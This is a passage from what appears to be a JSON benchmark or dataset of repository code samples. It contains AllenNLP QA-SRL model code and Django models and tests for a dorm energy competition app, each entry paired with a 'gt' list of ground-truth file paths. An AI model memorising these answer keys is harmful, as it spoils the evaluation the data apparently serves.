bio_logit = self.unwrap_to_tensors(bio_logit)\n        sequence_lengths = get_lengths_from_binary_sequence_mask(sequence_mask)\n\n        gold_spans = [[(spans[b, i, 0], spans[b, i, 1]) for i in range(spans.size(1)) if mask[b, i] == 1] for b in range(spans.size(0))]\n\n        if bio_logit is not None:\n            argmax_bio = bio_logit.max(-1)[1]\n        for i, l in enumerate(self._slot_labels):\n            g = []\n            p = []\n            logits, gold_labels = self.unwrap_to_tensors(slot_logits[i], slot_labels[i])\n            argmax_predictions = logits.max(-1)[1]\n            for b in range(mask.size(0)):\n                if bio_logit is not None:\n                    bio_predictions = argmax_bio[b, :]\n                    length = sequence_lengths[b]\n                    spans = self._extract_spans(bio_predictions[:length].tolist())\n                    spans = [s for s, tag in spans if tag != 'V']\n                else:\n                    spans = []\n\n                for n in range(mask.size(1)):\n                    if mask[b][n] == 1:\n                        assert (argmax_predictions[b, n] > 1), \"Invalid pred\" + str(slot_logits[i][b, n])\n                        p.append(self._vocabulary.get_index_to_token_vocabulary(\"slot_%s\"%(l))[int(argmax_predictions[b, n])])\n                        g.append(self._vocabulary.get_index_to_token_vocabulary(\"slot_%s\"%(l))[int(gold_labels[b, n])])\n                        if i == 0:\n                            if gold_spans[b][n] in spans:\n                                has_span.append(True)\n                            else:\n                                has_span.append(False)\n            gold.append(g)\n            pred.append(p)\n\n        gold_questions = []\n        pred_questions = []\n        for i in range(len(gold[0])):\n            g = []\n            p = []\n            for w in range(len(slot_labels)):\n                g.append(gold[w][i])\n                p.append(pred[w][i])\n            gold_questions.append(g)\n            pred_questions.append(p)\n\n        for i in range(len(gold_questions)):\n            correct = True\n            self._total_questions += 1\n            for w in range(len(slot_labels)):\n                self._total_words += 1\n                g = gold_questions[i][w]\n                p = pred_questions[i][w]\n\n                if g == p:\n                    self._correct[w] += 1\n                else:\n                    correct = False\n\n            g = gold_questions[i]\n            p = pred_questions[i]\n            if g[0] == p[0] and g[2] == p[2] and g[4] == p[4] and g[6] == p[6]:\n                self._partial_correct += 1\n\n            wh = g[0]\n            self._wh_total.setdefault(wh, 0.)\n            self._wh_total[wh] += 1\n            wh_type = \"core\" if wh in {\"what\", \"who\"} else \"aux\"\n            self._wh_total.setdefault(wh_type, 0.)\n            self._wh_total[wh_type] += 1\n\n            if g[0] == p[0]:\n                self._wh_correct.setdefault(wh, 0.)\n                self._wh_correct[wh] += 1\n                self._wh_correct.setdefault(wh_type, 0.)\n                self._wh_correct[wh_type] += 1\n            if correct:\n                self._completely_correct += 1\n\n                if has_span[i]:\n                    self._completely_correct_with_span += 1\n\n    def get_metric(self, reset=False):\n\n        all_metrics = {}\n        all_metrics[\"word-accuracy-overall\"] = sum(self._correct) / self._total_words\n        all_metrics[\"question-accuracy\"] = self._completely_correct / self._total_questions\n        all_metrics[\"partial-question-accuracy\"] = self._partial_correct / self._total_questions\n\n        if self._count_span:\n            all_metrics[\"question-and-span-accuracy\"] = self._completely_correct_with_span / self._total_questions\n\n        for i, l in enumerate(self._slot_labels):\n            all_metrics[\"word-accuracy-%s\"%(l)] = self._correct[i] / self._total_questions\n\n        if self._fine_grained:\n            for wh, total in self._wh_total.items():\n                correct = self._wh_correct.setdefault(wh, 0.)\n                all_metrics[\"wh[%s]-accuracy\"%wh] = correct / total\n\n        if reset:\n            self.reset()\n        return all_metrics\n\n    def _extract_spans(self, tag_sequence: List[int]) -> Set[Tuple[Tuple[int, int], str]]:\n        \"\"\"\n        Given an integer tag sequence corresponding to BIO tags, extracts spans.\n        Spans are inclusive and can be of zero length, representing a single word span.\n        Ill-formed spans are also included (i.e those which do not start with a \"B-LABEL\"),\n        as otherwise it is possible to get a perfect precision score whilst still predicting\n        ill-formed spans in addition to the correct spans.\n\n        Parameters\n        ----------\n        tag_sequence : List[int], required.\n            The integer class labels for a sequence.\n\n        Returns\n        -------\n        spans : Set[Tuple[Tuple[int, int], str]]\n            The typed, extracted spans from the sequence, in the format ((span_start, span_end), label).\n            Note that the label `does not` contain any BIO tag prefixes.\n        \"\"\"\n        spans = set()\n        span_start = 0\n        span_end = 0\n        active_conll_tag = None\n        for index, integer_tag in enumerate(tag_sequence):\n\n            string_tag = self._bio_vocabulary[integer_tag]\n            bio_tag = string_tag[0]\n            conll_tag = string_tag[2:]\n            if bio_tag == \"O\" or conll_tag ==\"V\":\n\n                if active_conll_tag:\n                    spans.add(((span_start, span_end), active_conll_tag))\n                active_conll_tag = None\n\n\n                continue\n            elif bio_tag == \"U\":\n\n\n\n                if active_conll_tag:\n                    spans.add(((span_start, span_end), active_conll_tag))\n                spans.add(((index, index), conll_tag))\n                active_conll_tag = None\n            elif bio_tag == \"B\":\n\n\n                if active_conll_tag:\n                    spans.add(((span_start, span_end), active_conll_tag))\n                active_conll_tag = conll_tag\n                span_start = index\n                span_end = index\n            elif bio_tag == \"I\" and conll_tag == active_conll_tag:\n\n                span_end += 1\n            else:\n\n\n\n\n\n\n\n                if active_conll_tag:\n                    spans.add(((span_start, span_end), active_conll_tag))\n                active_conll_tag = conll_tag\n                span_start = index\n                span_end = index\n\n        if active_conll_tag:\n            spans.add(((span_start, span_end), active_conll_tag))\n        return spans\n\n\n\n'nrl-qasrl/nrl/models/__init__.py'\n:from nrl.models.span_detector import SpanDetector\nfrom nrl.models.question_predictor import QuestionPredictor\nfrom nrl.models.qasrl_parser import QaSrlParser\n\n'nrl-qasrl/nrl/models/question_predictor.py'\n:from typing import Dict, List, TextIO, Optional, Set, Tuple\n\nfrom overrides import overrides\nimport torch\nfrom torch.nn.modules import Linear, Dropout\nfrom torch.autograd import Variable\nimport torch.nn.functional as F\n\nfrom allennlp.common import Params\nfrom allennlp.common.checks import ConfigurationError\nfrom allennlp.data import Vocabulary\nfrom allennlp.modules import Seq2SeqEncoder, TimeDistributed, TextFieldEmbedder\nfrom allennlp.modules.token_embedders import Embedding\nfrom allennlp.modules.span_extractors.endpoint_span_extractor import EndpointSpanExtractor\nfrom allennlp.models.model import Model\nfrom allennlp.nn import InitializerApplicator, RegularizerApplicator\nfrom allennlp.nn.util import get_text_field_mask, sequence_cross_entropy_with_logits\nfrom allennlp.nn.util import get_lengths_from_binary_sequence_mask, viterbi_decode\nfrom allennlp.training.metrics import SpanBasedF1Measure\n\nfrom nrl.modules.question_generator.question_generator import QuestionGenerator\nfrom nrl.metrics.question_prediction_metric import QuestionPredictionMetric\n\n@Model.register(\"question_predictor\")\nclass QuestionPredictor(Model):\n    def __init__(self, vocab: Vocabulary,\n                text_field_embedder: TextFieldEmbedder,\n                question_generator: QuestionGenerator,\n                stacked_encoder: Seq2SeqEncoder = None,\n                predicate_feature_dim: int = 100,\n                dim_hidden: int = 100,\n                embedding_dropout: float = 0.0,\n                initializer: InitializerApplicator = InitializerApplicator(),\n                regularizer: Optional[RegularizerApplicator] = None):\n        super(QuestionPredictor, self).__init__(vocab, regularizer)\n\n        self.dim_hidden = dim_hidden\n\n        self.text_field_embedder = text_field_embedder\n        self.predicate_feature_embedding = Embedding(2, predicate_feature_dim)\n\n        self.embedding_dropout = Dropout(p=embedding_dropout)\n\n        self.stacked_encoder = stacked_encoder\n\n        self.span_extractor = EndpointSpanExtractor(self.stacked_encoder.get_output_dim(), combination=\"x,y\")\n\n        self.question_generator = question_generator\n        self.slot_labels = question_generator.get_slot_labels()\n\n        self.question_metric = QuestionPredictionMetric(vocab, question_generator.get_slot_labels())\n\n    @overrides\n    def forward(self,\n                text: Dict[str, torch.LongTensor],\n                predicate_indicator: torch.LongTensor,\n                labeled_spans: torch.LongTensor,\n                **kwargs):\n        span_mask = (labeled_spans[:, :, 0] >= 0).long()\n\n        span_slot_labels = []\n        for i, n in enumerate(self.slot_labels):\n            if 'span_slot_%s'%n in kwargs and kwargs['span_slot_%s'%n] is not None:\n                span_slot_labels.append(kwargs['span_slot_%s'%n] * span_mask)\n        if len(span_slot_labels) == 0:\n            span_slot_labels = None\n\n        embedded_text_input = self.embedding_dropout(self.text_field_embedder(text))\n        mask = get_text_field_mask(text)\n        embedded_predicate_indicator = self.predicate_feature_embedding(predicate_indicator.long())\n\n        embedded_text_with_predicate_indicator = torch.cat([embedded_text_input, embedded_predicate_indicator], -1)\n        batch_size, sequence_length, embedding_dim_with_predicate_feature = embedded_text_with_predicate_indicator.size()\n\n        if self.stacked_encoder.get_input_dim() != embedding_dim_with_predicate_feature:\n            raise ConfigurationError(\"The SRL model uses an indicator feature, which makes \"\n                                     \"the embedding dimension one larger than the value \"\n                                     \"specified. Therefore, the 'input_dim' of the stacked_encoder \"\n                                     \"must be equal to total_embedding_dim + 1.\")\n\n        encoded_text = self.stacked_encoder(embedded_text_with_predicate_indicator, mask)\n\n        span_reps = self.span_extractor(encoded_text, labeled_spans, sequence_mask=mask, span_indices_mask = span_mask)\n\n        output_dict = {}\n        slot_logits = self.question_generator(span_reps, slot_labels=span_slot_labels)\n        for i, n in enumerate(self.slot_labels):\n\n            slot_logits[i][:,:,0:2] -= 9999999\n\n            output_dict[\"slot_logits_%s\"%n] = slot_logits[i]\n\n        loss = None\n        if span_slot_labels is not None:\n            for i, n in enumerate(self.slot_labels):\n                slot_loss = sequence_cross_entropy_with_logits(slot_logits[i], span_slot_labels[i], span_mask.float())\n                if loss is None:\n                    loss = slot_loss\n                else:\n                    loss += slot_loss\n            self.question_metric(slot_logits, span_slot_labels, labeled_spans, mask=span_mask, sequence_mask=mask)\n            output_dict[\"loss\"] = loss\n\n        output_dict['span_mask'] = span_mask\n\n        return output_dict\n\n    def get_metrics(self, reset: bool = False):\n        metric_dict = self.question_metric.get_metric(reset=reset)\n        if self.training:\n            metric_dict = {x: y for x, y in metric_dict.items() if \"word-accuracy\" not in x or x == \"word-accuracy-overall\"}\n\n        return metric_dict\n\n    @overrides\n    def decode(self, output_dict: Dict[str, torch.Tensor]) -> Dict[str, torch.Tensor]:\n        span_mask = output_dict['span_mask'].data.cpu()\n        batch_size, num_spans = span_mask.size()\n\n        slot_preds = []\n        for l in self.slot_labels:\n            maxinds = output_dict['slot_logits_%s'%(l)].data.cpu().max(-1)[1]\n            slot_preds.append(maxinds)\n\n        questions = []\n        for b in range(batch_size):\n            batch_questions = []\n            for i in range(num_spans):\n                if span_mask[b, i] == 1:\n\n                    slots = []\n                    for l, n in enumerate(self.slot_labels):\n                        slot_word = self.vocab.get_index_to_token_vocabulary(\"slot_%s\"%n)[int(slot_preds[l][b, i])]\n                        slots.append(slot_word)\n\n                    slots = tuple(slots)\n\n                    batch_questions.append(slots)\n\n            questions.append(batch_questions)\n\n        output_dict['questions'] = questions\n        return output_dict\n\n\n\n\n    @classmethod\n    def from_params(cls, vocab: Vocabulary, params: Params) -> 'BIOLabeler':\n        embedder_params = params.pop(\"text_field_embedder\")\n        text_field_embedder = TextFieldEmbedder.from_params(vocab, embedder_params)\n        stacked_encoder = Seq2SeqEncoder.from_params(params.pop(\"stacked_encoder\"))\n        predicate_feature_dim = params.pop(\"predicate_feature_dim\", 100)\n        dim_hidden = params.pop(\"hidden_dim\", 100)\n\n        question_generator = QuestionGenerator.from_params(vocab, params.pop(\"question_generator\"))\n\n\n\n        initializer = InitializerApplicator.from_params(params.pop('initializer', []))\n        regularizer = RegularizerApplicator.from_params(params.pop('regularizer', []))\n\n        params.assert_empty(cls.__name__)\n\n        return cls(vocab=vocab,\n                   text_field_embedder=text_field_embedder,\n                   stacked_encoder=stacked_encoder,\n                   question_generator=question_generator,\n                   predicate_feature_dim=predicate_feature_dim,\n                   dim_hidden=dim_hidden,\n                   initializer=initializer,\n                   regularizer=regularizer)\n\n'nrl-qasrl/nrl/models/qasrl_parser.py'\n:from typing import Dict\n\nfrom overrides import overrides\n\nimport torch\n\nfrom allennlp.models.model import Model\nfrom allennlp.common import Params\nfrom allennlp.data import Vocabulary\n\nfrom nrl.models.question_predictor import QuestionPredictor\nfrom nrl.models.span_detector import SpanDetector\n\n@Model.register(\"qasrl_parser\")\nclass QaSrlParser(Model):\n    def __init__(self, vocab: Vocabulary,\n                 span_detector: SpanDetector,\n                 question_predictor: QuestionPredictor):\n        super(QaSrlParser, self).__init__(vocab)\n        self.span_detector = span_detector\n        self.question_predictor = question_predictor\n\n    @overrides\n    def forward(self,\n                text: Dict[str, torch.LongTensor],\n                predicate_indicator: torch.LongTensor,\n                labeled_spans: torch.LongTensor = None,\n                annotations: Dict = None,\n                **kwargs):\n        raise NotImplementedException()\n\n    @classmethod\n    def from_params(cls, vocab: Vocabulary, params: Params) -> 'QaSrlParser':\n        span_detector = Model.from_params(vocab, params.pop(\"span_detector\"))\n        question_predictor = Model.from_params(vocab, params.pop(\"question_predictor\"))\n\n        return QaSrlParser(vocab, span_detector = span_detector, question_predictor = question_predictor)\n",
        "gt": [
            "'nrl-qasrl/nrl/metrics/question_prediction_metric.py'",
            "'nrl-qasrl/nrl/models/question_predictor.py'",
            "'nrl-qasrl/nrl/models/qasrl_parser.py'",
            "'nrl-qasrl/nrl/models/__init__.py'",
            "'nrl-qasrl/nrl/__init__.py'"
        ]
    },
    {
        "files": [
            "'makahiki/makahiki/apps/components/prizes/tests/prize_tests.py'",
            "'makahiki/makahiki/apps/components/makahiki_profiles/models.py'",
            "'makahiki/makahiki/apps/components/prizes/models.py'"
        ],
        "content": "'makahiki/makahiki/apps/components/prizes/tests/prize_tests.py'\n:import os\n\nfrom django.test import TestCase\nfrom django.conf import settings\nfrom django.core.files.images import ImageFile\nfrom django.db import IntegrityError\n\nfrom components.prizes.models import Prize\n\nclass PrizeTest(TestCase):\n\n  def testConstraints(self):\n\n    image_path = os.path.join(settings.PROJECT_ROOT, \"fixtures\", \"test_images\", \"test.jpg\")\n    image = ImageFile(open(image_path, \"r\"))\n    prize = Prize(\n        title=\"Super prize!\",\n        short_description=\"A test prize\",\n        long_description=\"A test prize\",\n        image=image,\n        award_to=\"individual_overall\",\n        competition_type=\"points\",\n        round_name=\"Round 1\",\n        value=5,\n    )\n    prize.save()\n\n    prize2 = Prize(\n        title=\"Dup prize!\",\n        short_description=\"A test prize\",\n        long_description=\"A test prize\",\n        image=image,\n        award_to=\"individual_overall\",\n        competition_type=\"points\",\n        round_name=\"Round 1\",\n        value=5,\n    )\n    try:\n      prize2.save()\n      self.fail(\"IntegrityError exception not thrown.\")\n    except IntegrityError:\n      pass\n\n    prize2.round_name = \"Overall\"\n    try:\n      prize2.save()\n    except IntegrityError:\n      self.fail(\"IntegrityError exception should not be thrown.\")\n\n    prize2.round_name = \"Round 1\"\n    prize2.competition_type = \"energy\"\n    try:\n      prize2.save()\n    except IntegrityError:\n      self.fail(\"IntegrityError exception should not be thrown.\")\n\n    prize2.competition_type = \"points\"\n    prize2.award_to = \"floor_overall\"\n    try:\n      prize2.save()\n    except IntegrityError:\n      self.fail(\"IntegrityError exception should not be thrown.\")\n\n\n    prize.image.delete()\n    prize.delete()\n    prize2.image.delete()\n    prize2.delete()\n'makahiki/makahiki/apps/components/makahiki_profiles/models.py'\n:import os\nimport datetime\n\nfrom django.db import models\nfrom django.db.models import Q\nfrom django.conf import settings\nfrom django.contrib.auth.models import User\nfrom django.contrib.contenttypes import generic\nfrom django.contrib.contenttypes.models import ContentType\nfrom django.db.models.signals import post_save\nfrom django.utils.translation import ugettext_lazy as _\nfrom django.core.exceptions import ObjectDoesNotExist\n\nfrom django.contrib.localflavor.us.models import PhoneNumberField\n\nfrom components.floors.models import Floor\nfrom components.makahiki_base import get_current_round\nfrom components.prizes import POINTS_PER_TICKET\nfrom components.cache.utils import invalidate_info_bar_cache\n\nclass InvalidRoundException(Exception):\n  def __init__(self, value):\n    self.value = value\n\n  def __str__(self):\n    return repr(self.value)\n\ndef _get_rounds():\n\n\n  return ((key, key) for key in settings.COMPETITION_ROUNDS.keys())\n\nclass ScoreboardEntry(models.Model):\n\n\n  profile = models.ForeignKey(\"Profile\", editable=False)\n  round_name = models.CharField(max_length=\"30\", choices=_get_rounds(), editable=False)\n  points = models.IntegerField(default=0, editable=False)\n  last_awarded_submission = models.DateTimeField(null=True, blank=True, editable=False)\n\n  class Meta:\n    unique_together = ((\"profile\", \"round_name\",),)\n    ordering = (\"round_name\",)\n\n  @staticmethod\n  def user_round_overall_rank(user, round_name):\n    entry, created = ScoreboardEntry.objects.get_or_create(\n      profile=user.get_profile(),\n      round_name=round_name\n    )\n\n\n    if entry.last_awarded_submission:\n      return ScoreboardEntry.objects.filter(\n          Q(points__gt=entry.points) |\n          Q(points=entry.points, last_awarded_submission__gt=entry.last_awarded_submission),\n          round_name=round_name,\n      ).count() + 1\n\n\n    return ScoreboardEntry.objects.filter(\n        points__gt=entry.points,\n        round_name=round_name,\n    ).count() + 1\n\n  @staticmethod\n  def user_round_floor_rank(user, round_name):\n    floor = user.get_profile().floor\n    entry, created = ScoreboardEntry.objects.get_or_create(\n      profile=user.get_profile(),\n      round_name=round_name\n    )\n\n    if entry.last_awarded_submission:\n      return ScoreboardEntry.objects.filter(\n          Q(points__gt=entry.points) |\n          Q(points=entry.points, last_awarded_submission__gt=entry.last_awarded_submission),\n          profile__floor=floor,\n          round_name=round_name,\n      ).count() + 1\n    else:\n      return ScoreboardEntry.objects.filter(\n          points__gt=entry.points,\n          profile__floor=floor,\n          round_name=round_name,\n      ).count() + 1\n\ndef _get_available_themes():\n\n\n  theme_dir = os.path.join(settings.PROJECT_ROOT, \"media\", \"css\")\n\n  return ((item, item) for item in os.listdir(theme_dir))\n\nclass Profile(models.Model):\n  user = models.ForeignKey(User, unique=True, verbose_name=_('user'), related_name='profile')\n  name = models.CharField(_('name'), unique=True, max_length=50)\n  first_name = models.CharField(_('first_name'), max_length=50, null=True, blank=True)\n  last_name = models.CharField(_('last_name'), max_length=50, null=True, blank=True)\n  points = models.IntegerField(default=0, editable=False)\n  last_awarded_submission = models.DateTimeField(null=True, blank=True, editable=False)\n  floor = models.ForeignKey(Floor, null=True, blank=True)\n  contact_email = models.EmailField(null=True, blank=True)\n  contact_text = PhoneNumberField(null=True, blank=True)\n  contact_carrier = models.CharField(max_length=50, null=True, blank=True)\n  enable_help = models.BooleanField(default=True)\n  canopy_member = models.BooleanField(default=False)\n  canopy_karma = models.IntegerField(default=0, editable=False)\n\n\n  setup_profile = models.BooleanField(default=False, editable=False)\n  setup_complete = models.BooleanField(default=False, editable=False)\n  completion_date = models.DateTimeField(null=True, blank=True, editable=False)\n\n\n  daily_visit_count = models.IntegerField(default=0, editable=False)\n  last_visit_date = models.DateField(null=True, blank=True)\n\n\n  referring_user = models.ForeignKey(User, null=True, blank=True, related_name='referred_profiles')\n  referrer_awarded = models.BooleanField(default=False, editable=False)\n\n  def __unicode__(self):\n      return self.name\n\n  def get_lounge_name(self):\n    return self.floor.dorm.name + '-' + self.floor.number\n\n  @staticmethod\n  def points_leaders(num_results=10, round_name=None):\n\n    if round_name:\n      return Profile.objects.filter(\n          scoreboardentry__round_name=round_name,\n      ).order_by(\"-scoreboardentry__points\", \"-scoreboardentry__last_awarded_submission\")[:num_results]\n\n    return Profile.objects.all().order_by(\"-points\", \"-last_awarded_submission\")[:num_results]\n\n  def available_tickets(self):\n\n    total_tickets = self.points / POINTS_PER_TICKET\n    allocated_tickets = self.user.raffleticket_set.count()\n\n    return total_tickets - allocated_tickets\n\n  def current_round_points(self):\n\n    current_round = get_current_round()\n    if current_round:\n      return ScoreboardEntry.objects.get(profile=self, round_name=current_round).points\n\n    return self.points\n\n  def current_round_overall_rank(self):\n\n    current_round = get_current_round()\n    if current_round:\n      return self.overall_rank(round_name=current_round)\n\n    return None\n\n  def current_round_floor_rank(self):\n\n    current_round = get_current_round()\n    if current_round:\n      return self.floor_rank(round_name=current_round)\n\n    return None\n\n  def floor_rank(self, round_name=None):\n\n    if round_name:\n      return ScoreboardEntry.user_round_floor_rank(self.user, round_name)\n\n\n\n    if self.last_awarded_submission:\n      return Profile.objects.filter(\n          Q(points__gt=self.points) |\n          Q(points=self.points, last_awarded_submission__gt=self.last_awarded_submission),\n          floor=self.floor,\n          user__is_staff=False,\n          user__is_superuser=False,\n      ).count() + 1\n\n    return Profile.objects.filter(\n        points__gt=self.points,\n        floor=self.floor,\n        user__is_staff=False,\n        user__is_superuser=False,\n    ).count() + 1\n\n\n  def overall_rank(self, round_name=None):\n    if round_name:\n      return ScoreboardEntry.user_round_overall_rank(self.user, round_name)\n\n\n\n    if self.last_awarded_submission:\n      return Profile.objects.filter(\n          Q(points__gt=self.points) |\n          Q(points=self.points, last_awarded_submission__gt=self.last_awarded_submission),\n          user__is_staff=False,\n          user__is_superuser=False,\n      ).count() + 1\n\n    return Profile.objects.filter(\n        points__gt=self.points,\n        user__is_staff=False,\n        user__is_superuser=False,\n    ).count() + 1\n\n  def canopy_karma_info(self):\n\n    query = Profile.objects.filter(canopy_member=True)\n    return {\n      \"rank\":query.filter(canopy_karma__gt=self.canopy_karma).count() + 1,\n      \"total\": query.count(),\n    }\n\n  def _is_canopy_activity(self, related_object):\n    return related_object != None and \\\n       ((hasattr(related_object, \"activity\") and related_object.activity.is_canopy)\n        or\n        (hasattr(related_object, \"commitment\") and related_object.commitment.is_canopy))\n\n  def add_points(self, points, submission_date, message, related_object=None):\n\n\n    transaction = PointsTransaction(\n        user=self.user,\n        points=points,\n        submission_date=submission_date,\n        message=message,\n    )\n    if related_object:\n      transaction.related_object = related_object\n\n    transaction.save()\n\n\n    invalidate_info_bar_cache(self.user)\n\n\n    if self._is_canopy_activity(related_object):\n        self.canopy_karma += points\n    else:\n        self.points += points\n\n        if not self.last_awarded_submission or submission_date > self.last_awarded_submission:\n          self.last_awarded_submission = submission_date\n\n        current_round = self._get_round(submission_date)\n\n\n        if current_round:\n          entry, created = ScoreboardEntry.objects.get_or_create(profile=self, round_name=current_round)\n          entry.points += points\n          if not entry.last_awarded_submission or submission_date > entry.last_awarded_submission:\n            entry.last_awarded_submission = submission_date\n          entry.save()\n\n  def remove_points(self, points, submission_date, message, related_object=None):\n\n\n    transaction = PointsTransaction(\n        user=self.user,\n        points=points * -1,\n        submission_date=submission_date,\n        message=message,\n    )\n    if related_object:\n      transaction.related_object = related_object\n\n    transaction.save()\n\n\n    invalidate_info_bar_cache(self.user)\n\n    if self._is_canopy_activity(related_object):\n        self.canopy_karma -= points\n    else:\n        self.points -= points\n\n        current_round = self._get_round(submission_date)\n\n        if current_round:\n          try:\n            entry = ScoreboardEntry.objects.get(profile=self, round_name=current_round)\n            entry.points -= points\n            if entry.last_awarded_submission == submission_date:\n\n              entry.last_awarded_submission = self._last_submitted_before(submission_date)\n\n            entry.save()\n          except ObjectDoesNotExist:\n\n            raise InvalidRoundException(\"Attempting to remove points from a round when the user has no points in that round.\")\n\n        if self.last_awarded_submission == submission_date:\n          self.last_awarded_submission = self._last_submitted_before(submission_date)\n\n  def _get_round(self, submission_date):\n\n\n    rounds = settings.COMPETITION_ROUNDS\n\n\n    for key in rounds:\n      start = datetime.datetime.strptime(rounds[key][\"start\"], \"%Y-%m-%d\")\n      end = datetime.datetime.strptime(rounds[key][\"end\"], \"%Y-%m-%d\")\n      if submission_date >= start and submission_date < end:\n        return key\n\n    return None\n\n  def _last_submitted_before(self, submission_date):\n\n\n    from components.activities.models import CommitmentMember, ActivityMember\n\n    last_date = None\n    try:\n\n      last_commitment = CommitmentMember.objects.filter(\n          user=self.user,\n          award_date__isnull=False,\n          award_date__lt=submission_date\n      ).latest(\"award_date\").award_date\n      last_date = last_commitment\n    except CommitmentMember.DoesNotExist:\n      pass\n\n    try:\n      last_activity = ActivityMember.objects.filter(\n          user=self.user,\n          approval_status=u\"approved\",\n          submission_date__lt=submission_date\n      ).latest(\"submission_date\").submission_date\n      if not last_date or last_date < last_activity:\n        last_date = last_activity\n    except ActivityMember.DoesNotExist:\n      pass\n\n    return last_date\n\n  def save(self, *args, **kwargs):\n\n    has_referral = self.referring_user is not None and not self.referrer_awarded\n    referrer = None\n    if has_referral and self.points >= 30:\n      self.referrer_awarded = True\n      referrer = Profile.objects.get(user=self.referring_user)\n      self.add_points(10, datetime.datetime.today(), 'Referred by %s' % referrer.name, self)\n\n    super(Profile, self).save(*args, **kwargs)\n\n    if referrer:\n      referrer.add_points(10, datetime.datetime.today(), 'Referred %s' % self.name, referrer)\n      referrer.save()\n\n  class Meta:\n    verbose_name = _('profile')\n    verbose_name_plural = _('profiles')\n\ndef create_profile(sender, instance=None, **kwargs):\n  if (kwargs.get('created', True) and not kwargs.get('raw', False)):\n    profile, created = Profile.objects.get_or_create(user=instance, name=instance.username)\n    for key in settings.COMPETITION_ROUNDS.keys():\n      entry, created = ScoreboardEntry.objects.get_or_create(profile=profile, round_name=key)\n\npost_save.connect(create_profile, sender=User)\n\nclass PointsTransaction(models.Model):\n\n  user = models.ForeignKey(User)\n  points = models.IntegerField()\n  submission_date = models.DateTimeField()\n  message = models.CharField(max_length=255)\n  object_id = models.PositiveIntegerField(null=True)\n  content_type = models.ForeignKey(ContentType, null=True)\n  related_object = generic.GenericForeignKey(\"content_type\", \"object_id\")\n\n  @staticmethod\n  def get_transaction_for_object(related_object, points):\n    try:\n      content_type = ContentType.objects.get_for_model(related_object)\n      return PointsTransaction.objects.filter(\n          points=points,\n          object_id=related_object.id,\n          content_type=content_type,\n      )[0]\n\n    except IndexError:\n      return None\n\n'makahiki/makahiki/apps/components/prizes/models.py'\n:from django.db import models\nfrom django.conf import settings\nfrom django.contrib.auth.models import User\n\nfrom components.makahiki_base import get_round_info\nfrom components.makahiki_profiles.models import Profile\nfrom components.floors.models import Dorm, Floor\n\nclass Prize(models.Model):\n\n  ROUND_CHOICES = ((round_name, round_name) for round_name in get_round_info().keys())\n  AWARD_TO_CHOICES = (\n      (\"individual_overall\", \"Individual (Overall)\"),\n      (\"individual_floor\",  \"Individual (\" + settings.COMPETITION_GROUP_NAME + \")\"),\n\n      (\"floor_overall\", settings.COMPETITION_GROUP_NAME + \" (Overall)\"),\n      (\"floor_dorm\", settings.COMPETITION_GROUP_NAME + \" (Dorm)\"),\n\n  )\n  AWARD_CRITERIA_CHOICES = (\n      (\"points\", \"Points\"),\n      (\"energy\", \"Energy\")\n  )\n\n  title = models.CharField(max_length=30, help_text=\"The title of your prize.\")\n  short_description = models.TextField(\n      help_text=\"Short description of the prize. This should include information about who can win it.\"\n  )\n  long_description = models.TextField(\n      help_text=\"Additional details about the prize.\"\n  )\n  value = models.IntegerField(help_text=\"The value of the prize.\")\n  image = models.ImageField(\n      max_length=1024,\n      upload_to=\"prizes\",\n      blank=True,\n      help_text=\"A picture of your prize.\"\n  )\n  round_name = models.CharField(\n      max_length=20,\n      choices=ROUND_CHOICES,\n      help_text=\"The round in which this prize can be won.\"\n  )\n  award_to = models.CharField(\n      max_length=20,\n      choices=AWARD_TO_CHOICES,\n      help_text=\"Who the prize is awarded to.  This is used to calculate who's winning.\"\n  )\n  competition_type = models.CharField(\n      max_length=20,\n      choices=AWARD_CRITERIA_CHOICES,\n      help_text=\"The 'competition' this prize is awarded to.\")\n\n  def __unicode__(self):\n    return self.round_name + \": \" + self.title\n\n  class Meta:\n    unique_together = (\"round_name\", \"award_to\", \"competition_type\")\n\n  def num_awarded(self, floor=None):\n\n    if self.award_to in (\"individual_overall\", \"floor_overall\", \"dorm\"):\n\n      return 1\n\n    elif self.award_to in (\"floor_dorm\", \"individual_dorm\"):\n\n      return Dorm.objects.count()\n\n    elif self.award_to == \"individual_floor\":\n\n      return Floor.objects.count()\n\n    raise Exception(\"Unknown award_to value '%s'\" % self.award_to)\n\n  def leader(self, floor=None):\n    if self.competition_type == \"points\":\n      return self._points_leader(floor)\n    else:\n      return self._energy_leader(floor)\n\n  def _points_leader(self, floor=None):\n    round_name = None if self.round_name == \"Overall\" else self.round_name\n    if self.award_to == \"individual_overall\":\n      return Profile.points_leaders(num_results=1, round_name=round_name)[0]\n\n    elif self.award_to == \"floor_dorm\":\n      return floor.dorm.floor_points_leaders(num_results=1, round_name=round_name)[0]\n\n    elif self.award_to == \"floor_overall\":\n      return Floor.floor_points_leaders(num_results=1, round_name=round_name)[0]\n\n    elif self.award_to == \"individual_floor\":\n      if floor:\n        return floor.points_leaders(num_results=1, round_name=round_name)[0]\n      return None\n\n    raise Exception(\"'%s' is not implemented yet.\" % self.award_to)\n\n  def _energy_leader(self, floor):\n    raise Exception(\"Energy leader information is not implemented here.  Needs to be implemented at view/controller layer.\")\n\nclass RaffleDeadline(models.Model):\n  ROUND_CHOICES = ((round_name, round_name) for round_name in get_round_info().keys())\n\n  round_name = models.CharField(\n      max_length=20,\n      choices=ROUND_CHOICES,\n      help_text=\"The round in which this prize can be won.\",\n      unique=True,\n  )\n  pub_date = models.DateTimeField()\n  end_date = models.DateTimeField()\n\n  def __unicode__(self):\n    return \"%s deadline\" % self.round_name\n\nclass RafflePrize(models.Model):\n  ROUND_CHOICES = ((round_name, round_name) for round_name in get_round_info().keys())\n\n  title = models.CharField(max_length=30, help_text=\"The title of your prize.\")\n  value = models.IntegerField(help_text=\"The value of your prize\")\n  description = models.TextField(\n      help_text=\"Description of the prize.  Uses <a href='http://daringfireball.net/projects/markdown/syntax'>Markdown</a> formatting.\"\n  )\n  image = models.ImageField(\n      max_length=1024,\n      upload_to=\"prizes\",\n      blank=True,\n      help_text=\"A picture of your prize.\"\n  )\n  deadline = models.ForeignKey(RaffleDeadline)\n  winner = models.ForeignKey(User, null=True, blank=True)\n\n  def __unicode__(self):\n    return \"%s: %s\" % (self.deadline.round_name, self.title)\n\n  def add_ticket(self, user):\n\n    profile = user.get_profile()\n    if profile.available_tickets() <= 0:\n      raise Exception(\"This user does not have any tickets to allocate.\")\n\n    ticket = RaffleTicket(raffle_prize=self, user=user)\n    ticket.save()\n\n  def remove_ticket(self, user):\n\n\n    ticket = RaffleTicket.objects.filter(raffle_prize=self, user=user)[0]\n    ticket.delete()\n\n  def 